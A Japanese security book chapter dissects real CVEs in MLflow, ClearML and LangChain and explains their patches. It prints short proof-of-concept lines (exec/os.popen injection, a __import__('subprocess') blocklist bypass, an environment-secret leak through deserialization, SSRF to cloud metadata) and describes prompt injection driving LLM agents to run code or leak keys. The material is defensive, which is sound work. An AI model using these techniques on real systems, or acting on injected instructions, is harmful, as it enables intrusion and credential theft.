**MLflow** は機械学習のライフサイクル（実験管理・再現性・デプロイ・モデルレジストリ）を管理するデファクト標準に近いプラットフォームで、月間1000万ダウンロード超。Facebook・Databricks・Microsoft・Accenture・Booking.com などが利用しているとされる。それだけに影響範囲が広く、2023年後半からCVSS 10.0級の欠陥が「50日で4件」というペースで報告され、繰り返し問題視された。

> 出典: Frequent critical flaws open MLflow users to imminent threats — https://www.csoonline.com/article/1293302/frequent-critical-flaws-open-mlflow-users-to-imminent-threats.html

#### 第1波（2023年11月報告分、SecurityWeek 1本目）

| CVE | 種別 | CVSS | 概要 |
|-----|------|------|------|
| CVE-2023-6018 | 任意ファイル書き込み | **10.0** | OS上の任意ファイルを上書きしRCEを達成 |
| CVE-2023-6015 | パストラバーサル | **10.0** | ディレクトリ移動による不正操作 |
| CVE-2023-1177 | 任意ファイルインクルード | Critical | 未認証でのリモートファイル読み取り |
| CVE-2023-6014 | 認証バイパス | Critical | アクセス制御の回避 |

#### 第2波（2023年末〜2024年初、CVSS 10.0が4件）

| CVE | 種別 | CVSS | 修正バージョン | 概要 |
|-----|------|------|----------------|------|
| CVE-2023-6831 | パストラバーサル（アーティファクト削除） | **10.0** | 2.9.2 | パスが正規化された「後」に検証されるため、検証をすり抜けサーバ上の任意ファイルを削除できる |
| CVE-2023-6977 | パス検証バイパス（LFI） | **10.0** | 2.9.2 | サーバ上の機微ファイルを読み取れる |
| CVE-2023-6709 | 悪意あるレシピ設定の読み込み | **10.0** | 2.9.2 | テンプレートエンジンの特殊要素検証不備からRCE |
| CVE-2024-0520 | `mlflow.data` のパス未サニタイズ | **10.0** | 2.9.2 | 細工したデータセットが未サニタイズのファイルパスを生成し、読み取り/上書き/RCE |
| （無名）SSRF | サーバサイドリクエストフォージェリ | High | 2.9.2 | 内部HTTP(S)サーバへのアクセス、RCEに繋がる可能性 |

> 出典: Critical Vulnerabilities Found in AI/ML Open Source Platforms — https://www.securityweek.com/critical-vulnerabilities-found-in-ai-ml-open-source-platforms/

#### パストラバーサルが成立する原理 — 「正規化の順序」という落とし穴

MLflowの欠陥の多くは **パストラバーサル**（別名ディレクトリトラバーサル。`../` などを使って想定ディレクトリの外へ抜け出し、任意のファイルを読み書き・削除する攻撃）に集約される。ここで特に教訓的なのが CVE-2023-6831 の「正規化と検証の順序」だ。

CSO OnlineとSecurityWeekの記述をまとめると、「**パスが使用前に正規化（normalize）されることで、検証チェックをすり抜けてサーバ上の任意ファイルを削除できる**」。この「正規化の順序」がなぜ致命的かを、概念コードで説明する。

```python
# アンチパターン: 検証してから正規化している（順序が逆）
def delete_artifact(user_path):
    # (1) まず「危険な文字が無いか」を検証したつもり
    if ".." in user_path:
        reject()
    # (2) その後で正規化・結合してファイル操作
    full = os.path.realpath(os.path.join(BASE_DIR, user_path))
    os.remove(full)   # sink
```

- **何が問題か。** 攻撃者は検証をすり抜けるために、`..` を直接書かずエンコードや別表現で埋め込む。あるいは検証が「文字列の見た目」だけを見ている一方、実際のファイル操作は正規化後の「解決済み絶対パス」に対して行われる。**「検証が見ているパス」と「操作が実際に触るパス」がズレる** と、検証は無意味になる。
- **正しい順序。** 鉄則は「**先に正規化（絶対パス化）してから、その結果がBASE_DIR配下に収まっているかを検証する**」。

```python
# 正しい構造: 先に解決し、後で境界を検証する
def delete_artifact(user_path):
    full = os.path.realpath(os.path.join(BASE_DIR, user_path))
    # realpath で ../ やシンボリックリンクを解決した「最終的な実体パス」を得てから
    # それが必ず BASE_DIR の内側にあることを確認する
    if os.path.commonpath([full, BASE_DIR]) != os.path.realpath(BASE_DIR):
        reject()
    os.remove(full)
```

`os.path.commonpath` は「両者の共通の先頭ディレクトリ」を返すため、`full` がBASE_DIRの外に出ていればここで弾ける。正規化を先に行うことで、`../` やシンボリックリンクの効果が「実体パス」に反映済みとなり、検証の対象と操作の対象が一致する。これがパストラバーサル対策の核心である。

#### 任意ファイル書き込み → RCE への連鎖（CVE-2023-6018）

CVSS 10.0の CVE-2023-6018 は「任意ファイル書き込み → RCE」。読み取り（LFI）よりファイル書き込みの方が深刻なのは、**書き込みは実行可能な状態を能動的に作り出せる** からだ。CSO Onlineは具体的な連鎖として「ファイルパス検証のバイパスを **SSH鍵の上書き** と組み合わせるとRCEになる」と述べる。原理は次の通り。

- 攻撃者がサーバの `~/.ssh/authorized_keys` を自分の公開鍵で上書きできれば、その後SSHでパスワードなしログインでき、正規の実行経路を得る。
- あるいは cron定義・起動スクリプト・`.bashrc`・Webアプリの設定ファイルなど「後で自動的に読み込まれ実行されるファイル」を上書きすれば、次回の読み込みタイミングでコードが走る。
- つまり「任意の場所に任意の内容を書ける」時点で、**サーバが自分自身で実行してくれるファイルを狙って書き換える** ことでRCEに昇格する。読み取り専用の脆弱性より一段危険なのはこのためだ。

同様に、LFI（読み取り）のCVE-2023-6977やCVE-2023-1177も、単独では「読むだけ」だが、サーバがSSH秘密鍵やクラウド認証情報を保持していれば **それらを読み出してクラウド全体へ横展開** できる。CSO Onlineが「SSH鍵やクラウド鍵が存在し、MLflowに読み取り権限があればシステム乗っ取りに至る」と警告するのはこの連鎖を指す。

#### 悪意あるレシピ/テンプレートによるRCE（CVE-2023-6709）

CVE-2023-6709は「テンプレートエンジンの特殊要素の検証不備」から生じるRCE。MLflowの「レシピ（Recipes）」はパイプライン構成をテンプレートとして記述する仕組みで、CSO Onlineによれば **テンプレートエンジンはカスタマイズ可能なコードを含むgitリポジトリ** として扱われる。

- テンプレートエンジン（Jinja2など）は、テンプレート内の `{{ ... }}` のような式を評価する。ここに攻撃者が制御する式やオブジェクト参照を注入できると、**サーバサイドテンプレートインジェクション（SSTI）** となり、テンプレート評価器を足がかりにPythonオブジェクトを辿って任意コード実行に到達しうる。
- 「レシピ設定を読み込む」という一見データ処理の操作が、実は **コードを評価する操作** になっている点が罠だ。設定ファイルやテンプレートを「データ」と思って外部由来のものを読み込むと、その中の式がsinkとして発火する。

> 出典: Frequent critical flaws open MLflow users to imminent threats — https://www.csoonline.com/article/1293302/frequent-critical-flaws-open-mlflow-users-to-imminent-threats.html

#### CVE-2024-0520 — 「データセットを開くだけ」でRCE

CVE-2024-0520（CVSS 10.0、`mlflow.data` モジュール）は、**細工したデータセットをMLflowに読み込ませるとファイルパスが未サニタイズで生成され、ファイルアクセス/上書き/RCEに至る** というもの。SecurityWeekは「crafted datasets generate file paths without sanitization」、CSO Onlineは「リモートデータソースを介したRCE」と説明する。

- MLflowはデータセットのメタデータ（保存先パスやソースURI）を記録・再取得する。攻撃者がこのメタデータに含まれるパスを操作できると、MLflowはそれを信頼してファイル操作やリモート取得を行う。
- ここでも本質は同じで、**「外部由来の文字列（データセットの記述）を、内部のファイルパス/URIとしてそのまま使う」** という信頼境界の破れである。パストラバーサルやSSRF（内部リソースへのリクエスト強制）へと展開する。

#### MLflowの防御まとめ

- **2.9.2 以降へアップグレードする**（第2波のCVSS 10.0群はこのバージョンで修正）。時事性のある内容のため、運用時は必ず最新の修正版と各CVEの修正コミットを確認すること。
- MLflow Tracking Server を **未認証でネットワーク露出させない**。認証プロキシ・ネットワークACL・VPN背後に置く。
- サーバのプロセス権限を最小化し、SSH鍵やクラウド認証情報と同じアカウント/ホストに同居させない（LFI/書き込みが致命化する連鎖を断つ）。
- 外部由来のレシピ・テンプレート・データセット定義を信頼しない。信頼できるソースのみを許可リスト化する。

---

### ClearML のCVE — MarkdownエディタのストアドXSS

**ClearML** は実験追跡・オーケストレーションを提供するMLOpsプラットフォーム。報告されたのは CVE-2023-6778（High）で、種別は **ストアドXSS（保存型クロスサイトスクリプティング）**。

- **場所**: プロジェクトのDescription／ReportsセクションのMarkdownエディタ。
- **仕組み**: エディタに入力されたデータがフィルタリングされずに注入される。攻撃者が悪意あるスクリプトを含むMarkdown/HTMLをプロジェクト説明やレポートに保存すると、それを閲覧した他ユーザーのブラウザでスクリプトが実行される。
- **影響**: ユーザーアカウントの乗っ取り（セッションクッキーやトークンの窃取など）。
- **修正**: ClearMLサーバのアップデートで対応。

> 出典: Critical Vulnerabilities Found in AI/ML Open Source Platforms — https://www.securityweek.com/critical-vulnerabilities-found-in-ai-ml-open-source-platforms/

#### なぜMarkdownエディタでXSSが起きるのか

XSSは「本来データであるはずのユーザー入力が、ブラウザにHTML/JavaScriptとして解釈されてしまう」脆弱性。**ストアド（保存型）** は、その悪意ある入力がサーバに保存され、後から閲覧する全ユーザーに配信される点で反射型より影響が広い。

- Markdownは最終的にHTMLへ変換される。多くのMarkdownレンダラは利便性のため **生のHTMLタグの埋め込みを許容** する。すると `<img src=x onerror=...>` や `<script>` のような要素が、変換後のDOMにそのまま入り込む。
- 「Markdownだから安全」という思い込みが危険で、**変換後のHTMLをサニタイズ（DOMPurifyなどで危険な要素・属性を除去）していなければ** XSSになる。
- ClearMLのケースは「エディタに入ったデータがフィルタされずに注入される（unfiltered data injection）」——つまりレンダリング時のサニタイズ欠如が原因である。

防御は、(1) Markdown→HTML変換の **後段** でDOMPurify等によりサニタイズする、(2) 生HTMLの埋め込みを禁止する（信頼できないコンテンツではraw HTMLを無効化する）、(3) CSP（Content Security Policy）で `script-src` を絞り、インラインスクリプトやイベントハンドラの発火を抑止する多層防御。MLOpsのUIは「社内の信頼できる同僚しか使わない」と過信されがちだが、共有プロジェクトやレポート機能は他ユーザーへスクリプトを届ける経路になる点に注意する。

---

### 章の技術的まとめ — 4つの再発パターン

これらの実CVEを貫く原理は、以下の4パターンに整理できる。CVE番号ではなく、この「パターン」を覚えることが実務では重要だ。

1. **未認証の露出（前提条件）** — H2O-3・MLflow・Ray はデフォルトで認証が無い。これが「未認証RCE」を成立させる土台。まず **ネットワーク分離と認証** で到達路を塞ぐことが最優先。
2. **未検証入力 → 危険なsink** — Rayのコマンドインジェクション（引数→シェル）、H2O-3のデシリアライズ（バイト列→オブジェクト復元）、MLflowのテンプレート評価（設定→式評価）。いずれも「データのつもりの入力がコード/コマンドとして解釈される」。sinkの手前で許可リスト検証、シェルを避ける、デシリアライズにクラス制限、を徹底する。
3. **パス操作の境界破り** — MLflowのパストラバーサル群。鉄則は「**先に正規化（実体パス化）してから境界を検証**」。任意書き込みはSSH鍵等の上書きでRCEへ、任意読み取りは鍵窃取でクラウド横展開へ昇格する。
4. **出力時のサニタイズ欠如** — ClearMLのストアドXSS。保存されたコンテンツをレンダリングする際にDOMPurify等で無害化し、CSPで多層に守る。

そして運用上の最重要教訓は、**MLOpsツールを絶対にインターネットへ直接露出させないこと**、および **修正版（例: MLflow 2.9.2 以降）への迅速なアップグレード** である。学習サーバは高権限とクレデンシャルの集約点であり、ひとたび侵害されればサプライチェーン全体（モデル・データ・クラウド）へ波及する。これらのCVEは2023〜2024年に集中して報告・修正されたものであり、対象バージョンと最新の修正状況は運用時点で必ず再確認すること。

> 出典（本節全体）:
> - Over a Dozen Exploitable Vulnerabilities Found in AI/ML Tools — https://www.securityweek.com/over-a-dozen-exploitable-vulnerabilities-found-in-ai-ml-tools/
> - Critical Vulnerabilities Found in AI/ML Open Source Platforms — https://www.securityweek.com/critical-vulnerabilities-found-in-ai-ml-open-source-platforms/
> - Frequent critical flaws open MLflow users to imminent threats — https://www.csoonline.com/article/1293302/frequent-critical-flaws-open-mlflow-users-to-imminent-threats.html

## LLMフレームワーク（LangChain）の実CVE

LLMアプリを「素の API 呼び出し」から一段抽象化して、ドキュメントローダー・ツール・エージェント・チェーン・プロンプトテンプレートといった部品を組み合わせられるようにしたのが **LangChain** である。Unit42 の集計時点で 100 万人超の開発者、GitHub スター 8 万超という巨大なエコシステムを持つ。しかしこの「部品の豊富さ」がそのまま攻撃対象領域（アタックサーフェス）になっている。LangChain の CVE を並べると、実は **中身は昔ながらの Web 脆弱性そのもの**——SSRF・OS コマンドインジェクション・安全でないデシリアライズ——であることがわかる。新しいのは「その脆弱な sink（入力が最終的に実行・解釈される危険な代入先）に、LLM の出力や外部ドキュメントというまったく検証されていないデータが流れ込む」という **データフローの構造**のほうだ。

この節では、LangChain の代表的な実 CVE を「昔ながらの脆弱性クラス × LLM 特有のデータフロー」という視点で分解し、各々について「なぜそのコードで脆弱になるのか」をソースコードのパッチ差分レベルで説明する。読者が対象としているのは防御・レビュー・パッチ適用であり、実在サービスへの無許可検証や破壊的手順は本書の範囲外である。

まず全体像を表にまとめる（バージョンは記事・GitHub Advisory 参照時点）。

| CVE | クラス | 脆弱な部品 | 影響パッケージ / 修正版 | CVSS |
|---|---|---|---|---|
| CVE-2023-34540 | OS コマンドインジェクション（RCE） | `JiraAPIWrapper.other()` の `exec()` | `langchain` < 0.0.225 → 0.0.225 | 9.8 |
| CVE-2023-44467 | サンドボックス回避 RCE | `PALChain`（`langchain_experimental`） | `langchain-experimental` ≤ 0.0.14 → 0.0.306 | 9.8 |
| CVE-2023-46229 | SSRF | `RecursiveUrlLoader` | `langchain` < 0.0.317 → 0.0.317 | 8.8 |
| CVE-2025-2828 | SSRF | `RequestsToolkit`（OpenAPI toolkit） | `langchain-community` < 0.0.28 → 0.0.28 | 8.4 |
| CVE-2025-68664 | 安全でないデシリアライズ（LangGrinch） | `dumps()`/`dumpd()` ↔ `load()`/`loads()` | `langchain-core` < 0.3.81、1.0.0〜1.2.4 → 0.3.81 / 1.2.5 | 9.3 |

---

### CVE-2023-34540 — `JiraAPIWrapper` の `exec()` による OS コマンドインジェクション

#### 何が起きたか

LangChain には各種 SaaS を LLM から操作するための「ツール」群があり、その一つが Jira を叩く `JiraAPIWrapper` である。エージェントに「Jira でこういう操作をして」と自然言語で頼むと、LLM が操作内容を決めて `JiraAPIWrapper` を呼ぶ。この `run()` には `jql`（検索）や `create_page` など複数のモードがあり、そのうち「その他の任意の Jira API を呼ぶ」ための `other` モードが決定的に危険だった。

修正前の `langchain/utilities/jira.py` の `other()` はこうなっていた（パッチ差分の削除側）。

```python
def other(self, query: str) -> str:
    context = {"self": self}
    exec(f"result = {query}", context)   # ← query をそのまま Python コードとして実行
    result = context["result"]
    return str(result)
```

`query` は「LLM が生成した文字列」であり、それを `exec()` に文字列連結して渡している。`exec()` は Python の任意コードを実行する組み込み関数だから、ここが完全な RCE sink になる。報告 Issue（#4833, LangChain 0.0.171）の再現手順はこうだ。

```python
jira = JiraAPIWrapper()
output = jira.run('other', "exec(\"import os;print(os.popen('id').read())\")")
```

`os.popen('id')` が実行され、`id` コマンドの出力が返る。攻撃者が `query` を操作できれば——たとえばプロンプトインジェクションで LLM に「`other` モードでこの Python を実行させる」よう誘導できれば——サーバー上で任意コマンドが走る。CVSS は 9.8（認証・UI 不要で機密性・完全性・可用性すべて全損）。

#### なぜそうなるのか（原理）

根本原因は「LLM に**コードを書かせて**、それを**評価器（`exec`）にそのまま渡す**」というアーキテクチャそのものにある。`exec(f"result = {query}", context)` は、`query` が信頼できるコードであるという暗黙の前提の上に成り立っているが、LLM の出力は本質的に「攻撃者が（間接的にでも）内容を左右できる untrusted なテキスト」だ。文字列テンプレートに埋め込んで評価している以上、`query` の中に任意の文がいくつでも書ける（`import os; ...` のようにセミコロンで文を連結できる）。これは SQL 文字列連結によるインジェクションと構造的に同じで、「コードとデータの境界」が消えていることが病理である。

#### 修正（0.0.225）

パッチは `exec()` を廃止し、「Python コードを受け取る」のをやめて「呼びたい関数名と引数を JSON で受け取り、`getattr` でディスパッチする」設計に変えた。

```python
def other(self, query: str) -> str:
    import json
    params = json.loads(query)
    jira_function = getattr(self.jira, params["function"])
    return jira_function(*params.get("args", []), **params.get("kwargs", {}))
```

入力は `{"function": "issue_create", "kwargs": {...}}` のような**データ構造**になり、実行されるのは `self.jira` の属性として実在するメソッドだけになった。`getattr` によるディスパッチは「任意コード」ではなく「許可された名前空間内のメソッド呼び出し」に制限される。プロンプトも「Python コードを渡せ」から「関数名と引数の辞書を渡せ」に書き換えられ、そもそも LLM にコードを書かせない方針に転換した。これが「コードとデータの境界を復活させる」典型的な修正である。

> ⚠️ **未取得の資料**: GitLab Advisory「CVE-2023-34540」ページは自動取得できませんでした（理由: サイトが JavaScript レンダリング前提で本文が空になり抽出不可）。以下からご自身でご覧ください: https://advisories.gitlab.com/pkg/pypi/langchain/CVE-2023-34540/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）GitLab Advisory は基本的に GitHub Security Advisory（GHSA-x32c-59v5-h7fg）と同一の内容を再掲しており、CWE-78（OS Command Injection）、影響 `langchain < 0.0.225`、修正 0.0.225、CVSS 9.8 という点は本文の記述と一致する。上記のコード差分・CVSS・影響範囲は GitHub Advisory API（GHSA-x32c-59v5-h7fg）および修正コミット `a2f191a` から直接取得・検証したものである。

> 出典: Unit42 "LangChain Vulnerabilities" — https://unit42.paloaltonetworks.com/langchain-vulnerabilities/ ／ GitHub Advisory GHSA-x32c-59v5-h7fg（コミット a2f191a、Issue #4833）— https://github.com/advisories/GHSA-x32c-59v5-h7fg

---

### CVE-2023-44467 — `PALChain` のブロックリスト回避による RCE

#### PALChain とは

`PALChain`（Program-Aided Language model）は「LLM に問題を解く Python コードを書かせ、それを実行して答えを得る」チェーンである。数学の文章題などで有効な反面、「LLM 生成コードを実行する」という設計そのものが RCE の温床になる。危険性は認識されており、`allow_imports`（`import` 文を AST 検査でブロック）と `allow_command_exec`（`system`, `exec`, `execfile`, `eval` の 4 つをブロックリスト化）という二重の防御が入っていた。

#### バイパスの原理

問題はブロックリストが不完全だったことだ。この CVE（別名としては CVE-2023-36258 の修正回避）は、`import` 文を使わずにモジュールを読み込む Python の組み込み関数 **`__import__()`** が禁止対象に入っていなかった点を突く。攻撃者はプロンプトインジェクションで LLM に次のようなコードを生成させる。

```python
__import__('subprocess').run(['id'])
```

これは AST 上「`import` 文」ではなく「関数呼び出し」なので `allow_imports` の検査をすり抜け、`system`/`exec`/`execfile`/`eval` のいずれでもないのでブロックリストにも当たらない。しかし `__import__('subprocess')` は `import subprocess` と等価にモジュールオブジェクトを返すため、そこから `subprocess.run` を呼べば任意コマンドが実行できる。CVSS 9.8。

これは「ブロックリスト（拒否リスト）方式の防御は、言語の抜け道を一つ見落とすだけで破れる」という原理の教科書的な例だ。Python は動的で、同じ効果を出す書き方が複数ある（`import X` / `__import__('X')` / `importlib.import_module('X')` など）。禁止すべき文字列を列挙する方式は、こうした等価表現を全部潰さない限り穴が残る。

#### 修正と本質的な限界

修正（PR #11233、`langchain-experimental` 0.0.306）はブロックリストに `__import__` などを追加して穴を塞いだ。ただし本質的には「LLM が生成した任意 Python を評価する」設計自体がハイリスクであり、LangChain 公式も `PALChain` を含む実験的機能を `langchain_experimental` に隔離し、利用側に強い注意を促している。Flatt Security の記事が「利用側の教訓」として真っ先に挙げるのも、`PythonREPLTool` や `PALChain` のような**実験的・危険な機能を設計段階で回避する**ことだ。ブロックリストを追いかけるより、そもそも untrusted なコード生成を実行系に流さないアーキテクチャにするのが正解である。

> 出典: Unit42 "LangChain Vulnerabilities" — https://unit42.paloaltonetworks.com/langchain-vulnerabilities/ ／ GitHub Advisory GHSA-gjjr-63x4-v8cq（PR #11233）— https://github.com/advisories/GHSA-gjjr-63x4-v8cq

---

### CVE-2023-46229 — `RecursiveUrlLoader` の SSRF

#### 何が起きたか

`RecursiveUrlLoader` は、起点 URL からページ内リンクを再帰的に辿ってドキュメントを収集する「クローラー型ローダー」である。RAG（検索拡張生成）のためにサイト全体を取り込む用途に使われる。SSRF（Server-Side Request Forgery: サーバーに攻撃者の指定した先へリクエストを送らせる脆弱性）が成立したのは、**辿る URL のスコープ（範囲）に制限がなかった**ためだ。GitHub Advisory の記述はこうだ。

> LangChain before 0.0.317 allows SSRF via `document_loaders/recursive_url_loader.py` because crawling can proceed from an external server to an internal server.

外部サーバーのページ内に `http://169.254.169.254/latest/meta-data/`（クラウドのインスタンスメタデータ）や `http://localhost:8500/`（内部サービス）へのリンクを仕込んでおき、そのページを起点にクローラーを走らせれば、クローラーは内部リソースへ GET リクエストを送ってしまう。Unit42 の解説は同系統の `SitemapLoader`（`WebBaseLoader` を継承し、`scrape_all` が `aiohttp.ClientSession.get` を宛先の検証なしに呼ぶ）を例に、悪意ある sitemap に intranet URL を並べることで内部リソースへの不正アクセス・機密データ（社会保障番号や従業員住所など）の窃取・内部 API 経由の攻撃に繋がると述べている。

#### なぜそうなるのか（原理）

SSRF の核心は「サーバーは内部ネットワークに対して特権的な位置にいる」ことだ。外からは届かない `localhost`・プライベート IP・クラウドメタデータエンドポイントに、サーバー自身は到達できる。クローラーが「取り込むべき URL」を外部データ（ページ内リンクや sitemap）から無検証で受け取ると、その「外部データを書いた者」がサーバーのリクエスト先を実質的に指定できてしまう。ここでの untrusted データは「クロール対象ページの中身」であり、これは完全に攻撃者側のコントロール下にある。

#### 修正（0.0.317）

修正は「デフォルトで起点 URL と同一ドメイン以外を辿らない」制限（`prevent_outside` 引数）を導入し、ドキュメントに明確なセキュリティ注意書きを追加した。修正コミットのソースコメントが原理をよく説明している。

```
While crawling, the crawler may encounter malicious URLs that would lead to a
server-side request forgery (SSRF) attack.

To mitigate risks, the crawler by default will only load URLs from the same
domain as the start URL (controlled via prevent_outside named argument).

This will mitigate the risk of SSRF attacks, but will not eliminate it.
```

重要なのは最後の一文「**緩和はするが、根絶はしない**」だ。同一ドメイン制限には限界がある。マルチテナントで `https://some_host/alice_site/` と `https://some_host/bob_site/` が同じホストに同居している場合、Alice のサイト上の悪意あるリンクから Bob のサイトのエンドポイントへリクエストを飛ばせてしまう（同一ホスト＝同一ドメイン判定を通過する）。だから根本対策は「**クローラーに内部ネットワークへのアクセス権を与えないネットワーク分離**」であり、アプリ層の allowlist はあくまで多層防御の一枚である。Flatt Security の記事も対策として「allowlist 形式での URL 検証フィルタ追加」を挙げている。

> 出典: Unit42 "LangChain Vulnerabilities" — https://unit42.paloaltonetworks.com/langchain-vulnerabilities/ ／ GitHub Advisory GHSA-655w-fm8m-m478（PR #11925、コミット 9ecb724）— https://github.com/advisories/GHSA-655w-fm8m-m478 ／ Flatt Security「LLM を活用したアプリケーションの脆弱性」— https://blog.flatt.tech/entry/llm_framework_security

---

### CVE-2025-2828 — `RequestsToolkit` の SSRF

#### 何が起きたか

これも SSRF だが、こちらは「エージェントに HTTP リクエストを送らせるツール」である `RequestsToolkit`（`langchain_community.agent_toolkits.openapi.toolkit.RequestsToolkit`）が舞台だ。GitHub Advisory（GHSA-h5gc-rm8j-5gpr）の記述はこうだ。

> the toolkit does not enforce restrictions on requests to remote internet addresses, allowing it to also access local addresses.

このツールキットは `RequestsGetTool`/`RequestsPostTool` など GET/POST/PATCH/PUT/DELETE の各ツールを提供し、OpenAPI 仕様を与えるとエージェントが自律的に API を叩く。宛先アドレスに制限がないため、リモートだけでなくローカルアドレスにもアクセスできてしまう。結果として、ポートスキャン、ローカルサービスへのアクセス、クラウド環境（Azure・AWS 等）のインスタンスメタデータの取得、内部ネットワーク上のサーバーとの通信が可能になる。CVSS は 8.4（`PR:H`＝高権限が前提だが、`S:C`＝スコープ変更ありで機密性・完全性・可用性が高影響）。修正版は `langchain-community` 0.0.28。

#### なぜそうなるのか、そして修正の考え方

原理は CVE-2023-46229 と同じ SSRF だが、こちらは「LLM エージェントが送信先 URL を決める」ため、プロンプトインジェクションで送信先を `169.254.169.254` などに誘導されるリスクが直接的だ。攻撃者が LLM への入力（あるいは取り込ませたドキュメント）を操作できれば、エージェントは「内部 API を叩け」という指示に素直に従ってしまう。

修正は URL フィルタを足すのではなく、**「危険であることを明示的に自覚させる」オプトイン方式**を採った。パッチ差分では各リクエストツールの基底クラスに `allow_dangerous_requests` フラグが追加され、初期化時に明示的に `True` を渡さない限り例外で拒否するようになった。

```python
class BaseRequestsTool(BaseModel):
    requests_wrapper: GenericRequestsWrapper
    allow_dangerous_requests: bool = False

    def __init__(self, **kwargs: Any):
        if not kwargs.get("allow_dangerous_requests", False):
            raise ValueError(
                "You must set allow_dangerous_requests to True to use this tool. "
                "Request scan be dangerous and can lead to security vulnerabilities. "
                "For example, users can ask a server to make a request to an internal "
                "server. ..."
            )
        super().__init__(**kwargs)
```

この設計の意図は「利用者に SSRF リスクを認識させ、プロキシ経由・サンドボックス化・信頼できない入力の排除といった対策を講じたうえで**意図的に有効化**させる」ことにある。フレームワーク側で URL を完璧にフィルタするのは（内部 IP のバリエーション、DNS リバインディング、リダイレクトなどがあり）困難なので、「危険な機能はデフォルト無効・明示同意で有効化」という安全側のデフォルトに倒したわけだ。Flatt Security の記事も、利用側は `allow_dangerous_requests` のような危険オプションを設計段階で避けるべきだと述べている。

> ⚠️ **未取得の資料**: GitLab Advisory「CVE-2025-2828」ページは自動取得できませんでした（理由: サイトが JavaScript レンダリング前提で本文が空になり抽出不可）。以下からご自身でご覧ください: https://advisories.gitlab.com/pkg/pypi/langchain-community/CVE-2025-2828/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）本文の記述（CWE-918 SSRF、影響 `langchain-community < 0.0.28`、修正 0.0.28、CVSS 8.4、`RequestsToolkit` 由来）は GitHub Advisory（GHSA-h5gc-rm8j-5gpr）および修正コミット `e188d4e` から直接取得・検証したもので、GitLab Advisory の再掲内容と一致する。報告は huntr のバウンティ（8f771040-...）経由。

> 出典: GitHub Advisory GHSA-h5gc-rm8j-5gpr（コミット e188d4e）— https://github.com/advisories/GHSA-h5gc-rm8j-5gpr

---

### CVE-2025-68664「LangGrinch」— `langchain-core` の安全でないデシリアライズ RCE / シークレット窃取

これは 2025 年 12 月に Cyata の Yarden Porat が公開した、`langchain-core` の中核シリアライズ機構を突く脆弱性で、CVSS **9.3**（Critical）。前述の CVE 群が「危険な部品を使ったときだけ」危ないのに対し、これは **`astream_events(version="v1")` や `RunnableWithMessageHistory` など広く使われる機能が内部で踏む**ため、影響範囲が桁違いに広い。

> ⚠️ **未取得の資料**: Cyata のブログ「All I Want for Christmas is Your Secrets: LangGrinch hits LangChain Core」は自動取得できませんでした（理由: `cyata.ai` が `checkpoint.com/ai-security/` へ 301 リダイレクトし、本文が取得できなかった。Wayback も 429 / アクセス不可）。以下からご自身でご覧ください: https://cyata.ai/blog/langgrinch-langchain-core-cve-2025-68664/
>
> 以下の技術解説は、LangChain 公式のセキュリティアドバイザリ（GHSA-c67j-w6g6-q2cm）本文・修正コミット・The Hacker News の Cyata 取材記事から取得・再構成したものである。

#### 仕組み — `lc` マーカーと「エスケープ漏れ」

LangChain はオブジェクトを JSON にシリアライズ（直列化）するとき、「これは単なる辞書ではなく LangChain のオブジェクトだ」と示すために予約キー **`'lc'`** を使う。たとえば環境変数から読むシークレットは、シリアライズ表現上こう表される。

```json
{"lc": 1, "type": "secret", "id": ["OPENAI_API_KEY"]}
```

`load()`/`loads()`（デシリアライズ）は、辞書に `'lc'` キーがあると「マニフェスト（オブジェクト復元指示）」とみなし、`type` に応じてシークレットの読み込みやクラスのインスタンス化を行う。ここで **`type: "secret"` は、デシリアライズ時に `id` で指定された名前の環境変数を読み込んで実際の値に展開する**（旧デフォルト `secrets_from_env=True` のとき）。

脆弱性の本体は、逆方向の `dumps()`/`dumpd()`（シリアライズ）にあった。Advisory の言葉を借りれば「これらの関数は自由形式の辞書をシリアライズする際、`'lc'` キーを持つ辞書を**エスケープしなかった**」。つまり、ユーザー由来の辞書がたまたま（あるいは意図的に）`'lc'` キーを含んでいても、それを「ただのユーザーデータ」として無害化せず、そのまま出力してしまう。その出力を後で `load()` すると、注入された構造が「正規の LangChain マニフェスト」として解釈される。CWE-502（Deserialization of Untrusted Data）そのものだ。

#### 攻撃の流れ — 自分の出力すら信用できない

Advisory が載せる最小の再現例が原理を端的に示す。

```python
from langchain_core.load import dumps, load
import os

# 攻撃者がユーザー制御フィールドに secret 構造を注入
attacker_dict = {
    "user_data": {
        "lc": 1,
        "type": "secret",
        "id": ["OPENAI_API_KEY"]
    }
}

serialized = dumps(attacker_dict)   # バグ: 'lc' キーをエスケープしない

os.environ["OPENAI_API_KEY"] = "sk-secret-key-12345"
deserialized = load(serialized, secrets_from_env=True)

print(deserialized["user_data"])   # "sk-secret-key-12345" ← シークレット漏洩！
```

注目すべきは、これが「攻撃者から受け取ったデータを直接デシリアライズした」ケースではなく、**アプリが自分で `dumps()` した出力を自分で `load()` しただけ**で成立している点だ。「自分のシリアライズ出力なら信用できる」という前提が崩れている。ユーザー由来の値が `'lc'` 構造を含んでいれば、往復（dump→load）を経ただけでシークレットが環境変数から抜き出される。

より現実的な侵入経路は **LLM の応答フィールド**だ。Advisory は「最も一般的な攻撃ベクトルは `additional_kwargs` や `response_metadata` のような LLM 応答フィールドで、これらはプロンプトインジェクションで制御でき、ストリーミング処理でシリアライズ/デシリアライズされる」と述べている。攻撃連鎖はこうなる。

1. 攻撃者が（外部ドキュメントやユーザー入力を通じて）LLM にプロンプトインジェクションを仕込む
2. LLM が応答の `additional_kwargs`/`response_metadata` に `{"lc":1,"type":"secret","id":["...")]}` のような構造を出力する
3. アプリが `astream_events(version="v1")` や `astream_log()`、`RunnableWithMessageHistory` 等でその応答をシリアライズ→デシリアライズする
4. デシリアライズ時に環境変数のシークレット（API キー等）が展開され、応答テキストや後続処理に混入 → 外部へ流出しうる

#### 影響の広さと第二の攻撃面

Advisory は影響を受ける「フロー」を 12 種類挙げている。代表例だけでも `astream_events(version="v1")`、`Runnable.astream_log()`、`RunnableWithMessageHistory`、`InMemoryVectorStore.load()`、`langchain-community` のキャッシュ、`hub.pull`（LangChain Hub からのマニフェスト取得）など、日常的に使われる機能が並ぶ（なお `astream_events(version="v2")` は影響を受けない）。

